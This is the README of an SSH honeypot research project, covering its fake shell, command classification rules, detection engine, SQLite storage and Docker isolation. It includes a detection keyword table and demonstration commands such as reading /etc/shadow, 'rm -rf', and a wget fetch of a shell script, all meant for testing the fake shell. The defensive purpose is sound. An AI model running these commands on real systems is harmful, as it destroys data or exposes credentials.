# SSH-HoneyGuard

> A Docker-isolated SSH honeypot for capturing SSH interactions, classifying attacker commands, detecting suspicious and multi-stage activity, persisting security events to SQLite, and visualizing them through a Streamlit dashboard.

---

## Table of Contents

- [Project Description](#project-description)
- [Key Features](#key-features)
- [System Architecture](#system-architecture)
- [Technology Stack](#technology-stack)
- [Project Structure](#project-structure)
- [How the SSH Honeypot Works](#how-the-ssh-honeypot-works)
- [Authentication Flow](#authentication-flow)
- [Fake Shell and Command Handling](#fake-shell-and-command-handling)
- [Command Classification](#command-classification)
- [Detection Engine](#detection-engine)
- [Multi-Stage Activity Detection](#multi-stage-activity-detection)
- [SQLite Data Storage](#sqlite-data-storage)
- [Streamlit Dashboard](#streamlit-dashboard)
- [Docker Isolation and Security Controls](#docker-isolation-and-security-controls)
- [Installation Requirements](#installation-requirements)
- [Setup Instructions](#setup-instructions)
- [Starting the Project](#starting-the-project)
- [Connecting to the Honeypot](#connecting-to-the-honeypot)
- [Accessing the Dashboard](#accessing-the-dashboard)
- [Example Safe Demonstration Commands](#example-safe-demonstration-commands)
- [Security Notes](#security-notes)
- [Known Limitations](#known-limitations)
- [Future Improvements](#future-improvements)
- [Research Context](#research-context)
- [License](#license)

---

## Project Description

SSH-HoneyGuard is a research-oriented SSH honeypot implemented in Python and deployed as two Docker containers: a honeypot container and a monitoring dashboard container. It listens for inbound SSH connections, accepts all password-based authentication attempts, presents a fake interactive shell to the attacker, classifies and logs every command entered, applies rule-based detection for suspicious activity, and stores all events in a SQLite database shared between the two containers.

The project is designed with an explicit focus on **auditability and explainability**: every detection decision traces back to a single, human-readable rule in the source code. There is no machine learning, no learned thresholds, and no hidden logic.

---

## Key Features

- **Accepts all SSH password connections** — every attacker who tries gets in, maximising capture of attacker behavior.
- **Fake interactive shell** — presents a realistic bash prompt (`honeypot:~$`) with static, pre-defined responses. No real OS commands are executed on the host.
- **Rule-based command classification** — each command is assigned one of nine categories: `destructive`, `credential`, `persistence`, `privesc`, `download`, `recon`, `network`, `file_activity`, or `unclassified`.
- **Immediate per-command alerts** — five high-priority categories (`credential`, `destructive`, `privesc`, `persistence`, `download`) generate a `security_alert` log event and database record at the moment the command is entered.
- **Brute-force authentication detection** — tracks failed authentication attempts per source IP in a sliding time window and fires an alert when the configured threshold is reached.
- **Multi-stage activity detection** — fires a single `multi_stage_activity` alert when a session accumulates commands across two or more distinct suspicious categories, suggesting coordinated attacker behavior.
- **SQLite persistence** — all sessions, authentication attempts, commands, and alerts are persisted to a SQLite database via SQLAlchemy.
- **Streamlit security dashboard** — a read-only monitoring dashboard (refreshed every 5 seconds) showing sessions, authentication attempts, commands by category, and security alerts.
- **Docker isolation** — both containers run as non-root users, with all Linux capabilities dropped and `no-new-privileges` set. The honeypot container is resource-capped (512 MB RAM, 1 CPU).
- **Structured JSON logging** — all events are written as JSON lines to both stdout and a log file.

---

## System Architecture

```
Internet / Attacker
        |
        v  TCP port 8080 (mapped to 2222 inside container)
+-------------------------------------+
|         honeypot container          |
|                                     |
|  SSHServer (Paramiko)               |
|     |                               |
|     +-- AcceptAllAuthPolicy         |
|     |      +-- DetectionEngine      |
|     |             +-- BruteForce    |
|     |                  Tracker      |
|     +-- FakeShell                   |
|            +-- classify_command()   |
|            +-- log_command_event()  |
|            +-- DetectionEngine      |
|                  +-- suspicious_cmd |
|                  +-- multi_stage    |
|                                     |
|  Database (SQLite WAL mode)         |
|     sessions / auth_attempts        |
|     commands / alerts               |
+------------------+------------------+
                   |  Docker named volume (ssh-honeyguard-data)
                   v
+-------------------------------------+
|         dashboard container         |
|                                     |
|  Streamlit app (read-only SQLite)   |
|     Sessions view                   |
|     Auth Attempts view              |
|     Commands view                   |
|     Alerts view                     |
+-------------------------------------+
        |
        v  TCP port 8501
   Security Analyst browser
```

Both containers share a single Docker-managed named volume (`ssh-honeyguard-data`) that holds the SQLite database. The dashboard opens the database file in SQLite URI read-only mode and cannot modify honeypot data.

---

## Technology Stack

| Component | Technology |
|-----------|------------|
| SSH protocol | Paramiko 3.4.0 |
| Database ORM | SQLAlchemy 2.0.29 |
| Database | SQLite (WAL mode) |
| Settings validation | Pydantic 2.6.4 |
| Configuration | YAML (`config/config.yaml`) + `.env` overrides |
| Dashboard | Streamlit 1.32.2 |
| Charts | Plotly 5.20.0 |
| Data processing | pandas 2.2.1 |
| Containerisation | Docker + Docker Compose |
| Python | 3.11 |

---

## Project Structure

```
ssh-honeyguard/
|-- app/                        # Honeypot application source
|   |-- __init__.py
|   |-- main.py                 # Container entrypoint
|   |-- config.py               # Settings loading (YAML + env vars)
|   |-- logging_config.py       # Structured JSON log formatter
|   |-- ssh_server.py           # TCP listener, per-connection threading
|   |-- ssh_session.py          # Session lifecycle and structured event logging
|   |-- authentication.py       # Paramiko ServerInterface, auth attempt logging
|   |-- fake_shell.py           # Fake interactive shell + command classification
|   |-- command_handler.py      # Command event logging + DB persistence
|   |-- database.py             # SQLite persistence layer (SQLAlchemy)
|   |-- models.py               # SQLAlchemy ORM models
|   +-- detection/
|       |-- __init__.py
|       |-- engine.py           # DetectionEngine: brute-force + multi-stage
|       |-- rules.py            # Explainable rule table (categories to severities)
|       +-- brute_force.py      # Sliding-window failed-auth tracker
|
|-- dashboard/
|   |-- app.py                  # Streamlit security dashboard
|   |-- Dockerfile              # Dashboard container build
|   |-- requirements.txt        # Dashboard-specific dependencies
|   +-- .streamlit/
|       +-- config.toml         # Streamlit server configuration
|
|-- config/
|   +-- config.yaml             # Base configuration (committed, no secrets)
|
|-- data/
|   +-- .gitkeep                # Placeholder (database and host key at runtime)
|
|-- logs/
|   +-- .gitkeep                # Placeholder (log file written at runtime)
|
|-- reports/
|   +-- .gitkeep                # Placeholder for future exports
|
|-- scripts/
|   +-- check_environment.py    # Pre-flight environment checker
|
|-- Dockerfile                  # Honeypot container build
|-- docker-compose.yml          # Orchestrates both containers + shared volume
|-- requirements.txt            # Honeypot runtime dependencies (pinned)
|-- requirements-dev.txt        # Dev/test dependencies (pytest, httpx)
|-- .env.example                # Environment variable template (safe to commit)
|-- .dockerignore               # Docker build context exclusions
+-- .gitignore                  # Git exclusions
```

---

## How the SSH Honeypot Works

1. **`main.py`** is the container entrypoint. It loads configuration, configures logging, instantiates `SSHServer`, and registers SIGTERM/SIGINT handlers for graceful shutdown.
2. **`SSHServer`** opens a TCP listening socket (default: `0.0.0.0:2222`). For each incoming connection it spawns a daemon thread to call `_handle_connection()`.
3. **`_handle_connection()`** creates an `SSHSession`, initialises a Paramiko `Transport`, adds the RSA host key, and runs the Paramiko server handshake via `AcceptAllAuthPolicy`.
4. After successful authentication it calls `transport.accept()` to wait for the attacker to open a channel, then hands the channel to `FakeShell.run()`.
5. `FakeShell` reads bytes from the channel in a loop, handling arrow-key escape sequences (for command history navigation), backspace, Ctrl+C, and Ctrl+U, then processes complete lines as commands.
6. Every command is classified, logged to JSON, persisted to SQLite, and forwarded to `DetectionEngine`.
7. The session ends when the attacker types `exit`/`logout`/`quit`, the idle timeout fires, or the channel closes.

---

## Authentication Flow

`AcceptAllAuthPolicy` (in `app/authentication.py`) implements Paramiko's `ServerInterface`:

- **Password authentication**: always returns `AUTH_SUCCESSFUL`. Every attempt (username, method, result) is logged and persisted. Password values are stored in the database to capture attacker credential attempts, but are never echoed in logs.
- **Public key authentication**: always returns `AUTH_FAILED`. The attempt is still logged.
- **Advertised methods**: `publickey,password` — advertising both allows real public-key attempts to reach the handler before the client falls back to password auth.
- **Shell / PTY requests**: both accepted so that real interactive SSH clients receive a working shell channel.
- **Exec requests** (`ssh host command`): rejected — only the interactive shell path is supported.

Every authentication event is forwarded to `DetectionEngine.record_auth_attempt()` for brute-force tracking.

---

## Fake Shell and Command Handling

`FakeShell` (in `app/fake_shell.py`) presents the prompt:

```
honeypot:~$
```

**Safety invariants** enforced throughout the module:
- Attacker input is **never** passed to `subprocess`, `os.system`, `eval`, `exec`, or any OS execution primitive.
- There is no access to the real host filesystem on the attacker's behalf.
- Responses are static, pre-defined byte strings, never dynamically derived from the host.
- Unrecognised commands receive a harmless `bash: <cmd>: command not found` response.

**Terminal features supported:**
- Arrow-key command history navigation (up/down)
- Backspace and character deletion
- Ctrl+C (clears current line buffer)
- Ctrl+U (clears line buffer to start)
- Input length limit (4 096 bytes) to prevent buffer-flooding

**Pre-defined static responses** include: `whoami`, `id`, `pwd`, `ls`, `uname -a`, `ps`, `hostname`, `date`, `ip addr`, `ifconfig`, `ipconfig`, `ss`, `netstat`, `route`, and more.

---

## Command Classification

Every command is classified by `classify_command()` using an ordered list of keyword rules. The first matching rule wins.

| Category | Example keywords | Alert generated? |
|----------|-----------------|-----------------|
| `destructive` | `rm -rf`, `mkfs`, `dd if=`, `shutdown`, `reboot` | YES — HIGH |
| `credential` | `passwd`, `/etc/shadow`, `/etc/passwd`, `chpasswd` | YES — HIGH |
| `persistence` | `crontab`, `systemctl`, `ssh-keygen`, `/etc/init.d` | YES — HIGH |
| `privesc` | `sudo`, `su -`, `chmod +s`, `chmod 4`, `chown root` | YES — HIGH |
| `download` | `curl`, `wget`, `scp` | YES — MEDIUM |
| `recon` | `whoami`, `id`, `uname`, `cat /etc/`, `ls /` | NO — logged only |
| `network` | `ip addr`, `ifconfig`, `netstat`, `route`, `ss` | NO — logged only |
| `file_activity` | `cat`, `find`, `locate`, `cp`, `mv` | NO — logged only |
| `unclassified` | anything else | NO — logged only |

Only the five highest-risk categories generate immediate `security_alert` events. Recon and network commands are fully logged without alerting, to avoid alert fatigue.

---

## Detection Engine

`DetectionEngine` (in `app/detection/engine.py`) is a single instance shared across all connections handled by the server. It is thread-safe via `threading.Lock`.

**Rule A — Suspicious command alert:**
When a command is classified into a suspicious category, `_emit_alert()` writes a `security_alert` record to the database and emits a WARNING-level structured log event.

**Rule B — Brute-force authentication alert:**
`BruteForceTracker` maintains a per-source-IP sliding window of failed authentication timestamps. When the count of failures from one IP within the configured window (default: 5 attempts in 5 minutes) reaches the threshold, a `brute_force_authentication` alert is emitted.

All alert records include:
- `alert_id` (UUID)
- `alert_type`
- `severity` (HIGH or MEDIUM)
- `reason` (human-readable text from `rules.py`)
- `evidence` (JSON-serialised dictionary)
- `session_id` and `source_ip`
- `timestamp`

---

## Multi-Stage Activity Detection

**Rule C — Multi-stage activity alert:**
The detection engine tracks which distinct suspicious categories have been seen within each session. When a session reaches two or more distinct suspicious categories (configurable via `detection.multi_stage_category_threshold` in `config.yaml`), a single `multi_stage_activity` alert is emitted for that session. This fires once per session to avoid alert spam.

Example: an attacker who runs a privilege-escalation command and then tries to download a payload triggers this alert.

---

## SQLite Data Storage

`Database` (in `app/database.py`) uses SQLAlchemy with a SQLite backend in WAL (Write-Ahead Logging) mode for concurrent read access from the dashboard container.

**Tables:**

| Table | Purpose |
|-------|---------|
| `sessions` | One row per SSH session (session_id, source_ip, source_port, started_at, ended_at, outcome) |
| `authentication_attempts` | One row per auth attempt (username, method, result, password, timestamp) |
| `commands` | One row per command (command_text, category, response_text, timestamp) |
| `alerts` | One row per detection alert (alert_id, alert_type, severity, reason, evidence) |

**Fail-soft design:** database write failures are caught and logged as warnings. A database error never terminates the honeypot or disrupts SSH handling.

---

## Streamlit Dashboard

`dashboard/app.py` is a read-only security monitoring dashboard built with Streamlit. It reconnects to the SQLite database every 5 seconds via `@st.cache_data(ttl=5)`.

**Views:**
- **Sessions** — all SSH sessions with source IP, timestamps, and outcome
- **Authentication attempts** — usernames, methods, results, timestamps
- **Commands** — command text, category, response, and session correlation
- **Alerts** — security alerts with type, severity, reason, and evidence

The dashboard opens the database in SQLite URI read-only mode (`?mode=ro`) and cannot modify honeypot data.

---

## Docker Isolation and Security Controls

| Control | Honeypot container | Dashboard container |
|---------|--------------------|---------------------|
| Base image | `python:3.11-slim` | `python:3.11-slim` |
| Runs as | `honeyguard` (UID 10001, non-root) | `dashboard` (UID 10002, non-root) |
| Capabilities | All dropped (`cap_drop: ALL`) | All dropped (`cap_drop: ALL`) |
| Privilege escalation | Blocked (`no-new-privileges: true`) | Blocked (`no-new-privileges: true`) |
| Memory limit | 512 MB | 512 MB |
| CPU limit | 1.0 vCPU | 1.0 vCPU |
| Network | Internal bridge (`honeyguard-net`) | Internal bridge (`honeyguard-net`) |
| Exposed port | 8080 -> 2222 (SSH) | 8501 (Streamlit) |
| Volume | `ssh-honeyguard-data` (read-write) | `ssh-honeyguard-data` (read-only by app) |

The honeypot container never executes attacker-supplied commands. All attacker input is treated strictly as data.

---

## Installation Requirements

- **Docker** >= 20.10
- **Docker Compose** >= 2.0 (the `docker compose` plugin)
- No Python installation required on the host.

For local development without Docker:
- Python 3.11
- `pip install -r requirements.txt`
- `pip install -r requirements-dev.txt`

---

## Setup Instructions

```bash
# 1. Clone the repository
git clone https://github.com/pravinkounder/SSH-HoneyGuard.git
cd SSH-HoneyGuard

# 2. Copy the environment template
cp .env.example .env
# Edit .env if you want to change ports or log levels.
# No external credentials are required.

# 3. Build both containers
docker compose build
```

---

## Starting the Project

```bash
# Start both the honeypot and the dashboard
docker compose up -d

# Follow live logs
docker compose logs -f

# Stop everything
docker compose down
```

---

## Connecting to the Honeypot

The honeypot listens on **host port 8080** (mapped to container port 2222).

```bash
# Connect with any SSH client (any username, any password)
ssh -p 8080 attacker@localhost

# Disable host-key checking for local testing
ssh -p 8080 -o StrictHostKeyChecking=no attacker@localhost
```

You will be presented with the fake shell prompt:

```
honeypot:~$
```

---

## Accessing the Dashboard

Open your browser and navigate to:

```
http://localhost:8501
```

The dashboard auto-refreshes every 5 seconds and shows live data from the shared SQLite database.

---

## Example Safe Demonstration Commands

These commands are safe to run inside the honeypot. They return static, pre-defined fake responses and are fully logged.

```bash
# Reconnaissance (logged, no alert)
whoami
id
uname -a
hostname
pwd
ls

# Network reconnaissance (logged, no alert)
ip addr
ifconfig
netstat
ss
route

# Commands that trigger security alerts (for testing the detection engine)
sudo su              # privesc alert (HIGH)
cat /etc/shadow      # credential alert (HIGH)
wget http://example.com/shell.sh   # download alert (MEDIUM)
crontab -e           # persistence alert (HIGH)
rm -rf /tmp/test     # destructive alert (HIGH)

# Trigger multi-stage alert (two different suspicious categories in one session)
sudo su
wget http://example.com/payload

# Exit the session
exit
```

---

## Security Notes

1. **Do not expose port 8080 to the open internet** without understanding the risks. This is a research tool.
2. **The honeypot accepts every password** by design. Do not run it on a port accessible to untrusted networks unless that is your explicit research goal.
3. **Captured data (SQLite database and log files) may contain real attacker credentials and commands.** Do not commit them to version control. They are excluded by `.gitignore`.
4. **The SSH host key** (`data/ssh_host_key`) is a real RSA private key generated on first run. It is excluded from version control.
5. **Password values are stored in the database** in the `authentication_attempts` table. Treat the database file as sensitive.
6. The detection engine state is in-memory only. Restarting the honeypot container resets the brute-force sliding window counter.

---

## Known Limitations

- **Accept-all authentication policy**: every password attempt is accepted. Real credential validation is not implemented.
- **No exec-mode support**: `ssh host command` (non-interactive exec mode) is explicitly rejected. Only the interactive shell path is supported.
- **In-memory brute-force state**: `BruteForceTracker` resets when the container restarts.
- **No real PTY allocation**: the fake shell acknowledges PTY requests at the protocol level but does not allocate a real pseudo-terminal. Character echo is handled by the fake shell itself.
- **Static command responses**: the fake shell returns pre-defined static strings and does not dynamically simulate a real system.
- **Single-instance only**: brute-force tracking is in-process only, not shared across multiple honeypot instances.
- **No email/webhook alerting**: alerts are written to the database and log file only.

---

## Future Improvements

The following are potential future directions, **not currently implemented**:

- Real credential validation to capture more realistic attacker behavior patterns.
- Persistent brute-force state across restarts (move counter to database).
- Alert delivery via email or webhook.
- Exec-mode SSH command capture.
- Expanding the fake filesystem and command response library.
- GeoIP lookup for source IP enrichment at analysis time.
- Export of alert and command data to CSV/JSON for offline analysis.

---

## Research Context

SSH-HoneyGuard was developed as a research project to study attacker behavior patterns on SSH services. The design prioritises:

- **Auditability**: every detection decision traces to an explicit, named rule.
- **Safety**: no attacker-supplied input is ever executed.
- **Explainability**: the detection rule table (`app/detection/rules.py`) is the single authoritative source for why any alert fires.
- **Transparency**: the implementation records what it sees, not inferred conclusions about attacker intent.

---

## License

MIT License

Copyright (c) 2026 Pravin Kounder

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
